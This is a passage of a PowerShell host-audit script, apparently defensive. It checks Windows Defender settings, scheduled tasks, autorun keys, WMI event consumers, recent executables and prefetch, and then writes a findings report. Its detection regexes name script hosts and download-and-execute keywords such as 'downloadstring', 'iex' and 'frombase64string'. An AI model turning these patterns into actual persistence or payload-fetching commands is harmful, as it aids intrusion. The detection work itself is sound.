    '\\123pan-updater\\',
    '\\~nsu\.tmp\\',
    '\\nsw[^\\]*\.tmp\\',
    '\\nsq[^\\]*\.tmp\\',
    '\\SoftwareDistribution\\',
    '\\ProgramData\\Microsoft\\',
    '\\chocolatey\\',
    '\\AppData\\Local\\Programs\\',
    '\\AppData\\Local\\Temp\\[0-9A-Fa-f-]{36}\\',
    '\\AppData\\Local\\Temp\\DEFF06BB-C8AC-44E3-8CA7-532298738FAD\\',
    '\\AppData\\Local\\Temp\\7077D0D9-5B59-476C-8609-A0191DE50038\\',
    '\\AppData\\Local\\Temp\\09F5D73F-4BE7-4283-B331-5D4E8BFA2565\\'
)

$IgnoreFileNames = @(
    '^handle64\.exe$',
    '^AppxProvider\.dll$',
    '^AssocProvider\.dll$',
    '^CbsProvider\.dll$',
    '^DismCore\.dll$',
    '^DismCorePS\.dll$',
    '^DismHost\.exe$',
    '^DismProv\.dll$',
    '^DmiProvider\.dll$',
    '^FfuProvider\.dll$',
    '^FolderProvider\.dll$',
    '^GenericProvider\.dll$',
    '^IBSProvider\.dll$',
    '^ImagingProvider\.dll$',
    '^IntlProvider\.dll$',
    '^LogProvider\.dll$',
    '^MsiProvider\.dll$',
    '^OfflineSetupProvider\.dll$',
    '^OSProvider\.dll$',
    '^ProvProvider\.dll$',
    '^SetupPlatformProvider\.dll$',
    '^SmiProvider\.dll$',
    '^SysprepProvider\.dll$',
    '^TransmogProvider\.dll$',
    '^UnattendProvider\.dll$',
    '^VhdProvider\.dll$',
    '^WimProvider\.dll$'
)

$ExecutableExtensions = @('.exe', '.ps1', '.bat', '.cmd', '.vbs', '.jse', '.hta', '.scr')
$DllExtensions = @('.dll')
$LowSignalExtensions = @('.js')

# -----------------------------
# Defender
# -----------------------------
function Audit-Defender {
    try {
        $mp = Get-MpComputerStatus
        if ($null -eq $mp) { return }

        if (-not $mp.RealTimeProtectionEnabled) {
            Add-Finding -Severity High -Category Defender -Title 'Defender real-time protection is disabled' -Detail ''
        }
        if (-not $mp.AntivirusEnabled) {
            Add-Finding -Severity High -Category Defender -Title 'Defender antivirus is not enabled' -Detail ''
        }
        if ($mp.PSObject.Properties.Name -contains 'BehaviorMonitorEnabled') {
            if (-not $mp.BehaviorMonitorEnabled) {
                Add-Finding -Severity Medium -Category Defender -Title 'Behavior monitoring is disabled' -Detail ''
            }
        }
        if ($mp.PSObject.Properties.Name -contains 'IoavProtectionEnabled') {
            if (-not $mp.IoavProtectionEnabled) {
                Add-Finding -Severity Medium -Category Defender -Title 'Downloaded file scanning (IOAV) is disabled' -Detail ''
            }
        }
    }
    catch {}
}

# -----------------------------
# Persistence
# -----------------------------
function Audit-Tasks {
    $taskRows = Get-TaskActionObjects
    foreach ($row in $taskRows) {
        $fullName = $row.FullName
        $exec = Normalize-Path $row.Execute
        $args = Normalize-Path $row.Arguments
        $combined = (($exec, $args) -join ' ').Trim()

        $skip = $false
        foreach ($p in $KnownGoodTaskNames) {
            if ($fullName -match $p) { $skip = $true; break }
        }
        if (-not $skip) {
            foreach ($loc in $KnownGoodTaskLocations) {
                if ($fullName -like "*$loc*") { $skip = $true; break }
            }
        }
        if ($skip) { continue }

        $execLower = ($exec | ForEach-Object { $_.ToLowerInvariant() })
        $argsLower = ($args | ForEach-Object { $_.ToLowerInvariant() })
        $combinedLower = ($combined | ForEach-Object { $_.ToLowerInvariant() })

        $isSuspiciousHost = $false
        if ($execLower -match 'powershell|pwsh|cmd\.exe|wscript\.exe|cscript\.exe|mshta\.exe|regsvr32\.exe|rundll32\.exe') {
            $isSuspiciousHost = $true
        }

        $isRiskyArgs = $false
        if ($argsLower -match 'bypass|hidden|windowstyle|frombase64string|invoke-restmethod|invoke-webrequest|downloadstring|iex|\.ps1|appdata|programdata') {
            $isRiskyArgs = $true
        }

        if ($isSuspiciousHost -and $isRiskyArgs) {
            Add-Finding -Severity High -Category Persistence -Title ("Scheduled task uses suspicious host: {0}" -f $fullName) -Detail $combined
            continue
        }

        if ($combinedLower -match '\.ps1|\.vbs|\.js' -and $fullName -notmatch '^\\Microsoft\\Windows\\') {
            Add-Finding -Severity Medium -Category Persistence -Title ("Scheduled task references script content: {0}" -f $fullName) -Detail $combined
        }
    }
}

function Audit-Startup {
    $startupEntries = @()

    $regPaths = @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
    )

    foreach ($rp in $regPaths) {
        try {
            $item = Get-ItemProperty -Path $rp
            foreach ($prop in $item.PSObject.Properties) {
                if ($prop.Name -in @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider')) { continue }
                $startupEntries += [PSCustomObject]@{
                    Name  = [string]$prop.Name
                    Value = [string]$prop.Value
                    Path  = $rp
                }
            }
        }
        catch {}
    }

    foreach ($entry in $startupEntries) {
        $skip = $false
        foreach ($p in $KnownGoodStartupNames) {
            if ($entry.Name -match $p) { $skip = $true; break }
        }
        if (-not $skip) {
            foreach ($s in $KnownGoodStartupPaths) {
                if ($entry.Value -like "*$s*") { $skip = $true; break }
            }
        }
        if ($skip) { continue }

        $valueLower = $entry.Value.ToLowerInvariant()
        if ($valueLower -match 'powershell|pwsh|wscript|cscript|mshta|regsvr32|rundll32' -and
            $valueLower -match 'bypass|hidden|frombase64string|downloadstring|iex|invoke-restmethod|invoke-webrequest|\.ps1|appdata|programdata') {
            Add-Finding -Severity High -Category Persistence -Title ("Autorun uses suspicious host: {0}" -f $entry.Name) -Detail ("{0} => {1}" -f $entry.Path, $entry.Value)
        }
    }
}

function Audit-WMI {
    $hasCim = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($hasCim) {
        try {
            $consumers = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer
            foreach ($c in $consumers) {
                $detail = $c.CommandLineTemplate
                Add-Finding -Severity High -Category Persistence -Title 'WMI CommandLineEventConsumer detected' -Detail $detail
            }
            return
        }
        catch {}
    }

    $hasWmi = Get-Command Get-WmiObject -ErrorAction SilentlyContinue
    if ($hasWmi) {
        try {
            $consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
            foreach ($c in $consumers) {
                $detail = $c.CommandLineTemplate
                Add-Finding -Severity High -Category Persistence -Title 'WMI CommandLineEventConsumer detected' -Detail $detail
            }
            return
        }
        catch {}
    }
}

# -----------------------------
# Recent files
# -----------------------------
function Should-IgnoreRecentFile {
    param([System.IO.FileInfo]$File)

    if ($null -eq $File) { return $true }

    foreach ($p in $IgnoreRecentFilePathPatterns) {
        if ($File.FullName -match $p) { return $true }
    }

    foreach ($n in $IgnoreFileNames) {
        if ($File.Name -match $n) { return $true }
    }

    return $false
}

function Audit-RecentFiles {
    $roots = @(
        'C:\ProgramData',
        $env:APPDATA,
        $env:LOCALAPPDATA,
        $env:TEMP
    ) | Where-Object { $_ -and (Test-Path $_) }

    $all = @()
    foreach ($root in $roots) {
        try {
            $all += Get-ChildItem -LiteralPath $root -Recurse -File -Force | Where-Object { $_.CreationTime -ge $Since }
        }
        catch {}
    }

    foreach ($f in $all) {
        if (Should-IgnoreRecentFile -File $f) { continue }

        $ext = $f.Extension.ToLowerInvariant()
        $detail = ('{0} | Created: {1}' -f $f.FullName, $f.CreationTime.ToString('MM/dd/yyyy HH:mm:ss'))

        if ($ExecutableExtensions -contains $ext) {
            $sig = Get-SignatureStatus -Path $f.FullName
            $severity = 'Medium'
            if ($sig -notin @('Valid','NotSigned')) {
                $severity = 'High'
            }
            Add-Finding -Severity $severity -Category Files -Title ("Recent executable/script file: {0}" -f $f.Name) -Detail ($detail + ' | Signature: ' + $sig)
            continue
        }

        if ($DllExtensions -contains $ext) {
            $sig = Get-SignatureStatus -Path $f.FullName
            if ($sig -notin @('Valid','NotSigned')) {
                Add-Finding -Severity Low -Category Files -Title ("Recent DLL: {0}" -f $f.Name) -Detail ($detail + ' | Signature: ' + $sig) -AppendixOnly
            }
            continue
        }

        if ($LowSignalExtensions -contains $ext) {
            Add-Finding -Severity Low -Category Files -Title ("Recent low-signal script file: {0}" -f $f.Name) -Detail $detail -AppendixOnly
        }
    }
}

# -----------------------------
# Trace
# -----------------------------
function Audit-Prefetch {
    $pfDir = 'C:\Windows\Prefetch'
    if (-not (Test-Path $pfDir)) { return }

    $hosts = @('POWERSHELL', 'PWsh', 'CMD', 'CMDER', 'WSCRIPT', 'CSCRIPT', 'MSHTA', 'RUNDLL32')
    try {
        $items = Get-ChildItem $pfDir -File | Where-Object { $_.LastWriteTime -ge $PrefetchSince }
        foreach ($item in $items) {
            $name = $item.Name.ToUpperInvariant()
            foreach ($h in $hosts) {
                if ($name -like "$($h.ToUpperInvariant())*.PF") {
                    Add-Finding -Severity Low -Category Trace -Title ("Recent prefetch for script host: {0}" -f $item.Name) -Detail ("LastWrite: {0}" -f $item.LastWriteTime.ToString('MM/dd/yyyy HH:mm:ss')) -AppendixOnly
                    break
                }
            }
        }
    }
    catch {}
}

# -----------------------------
# Execute audits
# -----------------------------
Audit-Defender
Audit-Tasks
Audit-Startup
Audit-WMI
Audit-RecentFiles
Audit-Prefetch

# -----------------------------
# Output
# -----------------------------
$mainCount = @($Script:MainFindings).Count
$allCount  = $mainCount + @($Script:AppendixFindings).Count

$lines = New-Object System.Collections.Generic.List[string]
$lines.Add(("Security audit report - {0}" -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')))
$lines.Add(("Computer: {0}  User: {1}" -f $env:COMPUTERNAME, $env:USERNAME))
$lines.Add("========================================================================")
$lines.Add(("RecentDays: {0}" -f $RecentDays))
$lines.Add(("MainFindingCount: {0}" -f $mainCount))
$lines.Add(("AllFindingCount: {0}" -f $allCount))
$lines.Add("")
$lines.Add("=== MAIN REPORT ===")

foreach ($f in $Script:MainFindings) {
    $lines.Add(("[{0}] [{1}] {2}" -f $f.Severity, $f.Category, $f.Title))
    if ($f.Detail) { $lines.Add(("    {0}" -f $f.Detail)) }
}

if (@($Script:AppendixFindings).Count -gt 0) {
    $lines.Add("")
    $lines.Add("=== APPENDIX / LOW-SIGNAL CONTEXT ===")
    foreach ($f in $Script:AppendixFindings) {
        $lines.Add(("[{0}] [{1}] {2}" -f $f.Severity, $f.Category, $f.Title))
        if ($f.Detail) { $lines.Add(("    {0}" -f $f.Detail)) }
    }
}

# console summary
Write-Host ("Security audit report - {0}" -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) -ForegroundColor Cyan
Write-Host ("Computer: {0}  User: {1}" -f $env:COMPUTERNAME, $env:USERNAME)
Write-Host "========================================================================"
Write-Host ("RecentDays: {0}" -f $RecentDays)
Write-Host ("MainFindingCount: {0}" -f $mainCount)
Write-Host ("AllFindingCount: {0}" -f $allCount)
Write-Host ""
Write-Host "=== MAIN REPORT ===" -ForegroundColor Yellow

foreach ($f in $Script:MainFindings) {
    $detail = ''
    if ($f.Detail) { $detail = " | $($f.Detail)" }
    Write-Host ("[{0}] [{1}] {2}{3}" -f $f.Severity, $f.Category, $f.Title, $detail)
}

if ($ExportText) {
    $fileName = "security-audit-{0}.txt" -f (Get-Date).ToString('yyyyMMdd-HHmmss')
    $outPath = Join-Path -Path (Get-Location) -ChildPath $fileName
    [System.IO.File]::WriteAllLines($outPath, $lines, (New-Object System.Text.UTF8Encoding($true)))
    Write-Host ""
    Write-Host ("Text report exported: {0}" -f $outPath) -ForegroundColor Green
}

```



